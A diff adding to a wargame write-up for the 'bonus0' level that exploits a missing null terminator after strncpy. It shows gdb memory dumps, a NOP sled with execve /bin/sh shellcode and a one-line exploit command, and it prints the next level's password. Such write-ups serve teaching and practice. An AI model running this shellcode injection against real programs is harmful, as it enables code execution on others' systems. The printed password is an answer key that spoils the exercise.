@@ -13,4 +13,50 @@ then strcpy the first array in the argument buf of the function. put a space a t
 
 disas p -> create a char array of size 4096 .print the second argument then wait for the user to type with read then search for a '\n' then strncpy 20 char of buf in the first argument.
 
-The problem that can occurs here is that if the user types more than 20 chars then the string will not be null terminated and it will cause a segmentation fault. We are going to exploit this
+The problem that can occurs here is that if the user types more than 20 chars then the string will not be null terminated and it will cause a segmentation fault. We are going to exploit this by using a shellcode injection.
+
+As the buffer of read is bug (4096) we will be able to place in it the shellcode after some NOP instruction.
+
+Let's find the adress where we can put the NOP instruction followed by the the shellcode
+
+b *p+64 (after the read) -> r -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -> x/50wx $ebp - 0x1008 ->
+
+0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe700:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe710:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe720:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe730:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe740:	0x41414141	0x41414141
+
+We see the chars A (0x41) from 0xbfffe680 but we will use 0xbfffe710 to be sure because after the second read this will normally by overwrite.
+
+To be sure  after -> c -> BBBBBBBBBBBBBBBBBBBBBBBBBB -> x/50wx $ebp - 0x1008 -> 
+
+0xbfffe680:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbfffe690:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbfffe6a0:	0x42424242	0x42424242	0x410a4242	0x41414141
+0xbfffe6b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe700:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe710:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe720:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe730:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe740:	0x41414141	0x41414141
+
+We can see that the 'B' overwrote the 'A' chars. But we still have our 'A' chars after so let's use 0xbfffe710. 
+
+In the first read we are going to put enough NOP instruction followed by the shellcode and in the second buffer enough 'B' then the adress of the NOP instructions we chose followed by one char to avoid the shift due to the space char
+
+(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; python -c 'print "B" * 14 + "\x10\xe7\xff\xbf" + "A"'; cat) | ./bonus0
+
+-> cat /home/user/bonus1/.pass -> cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
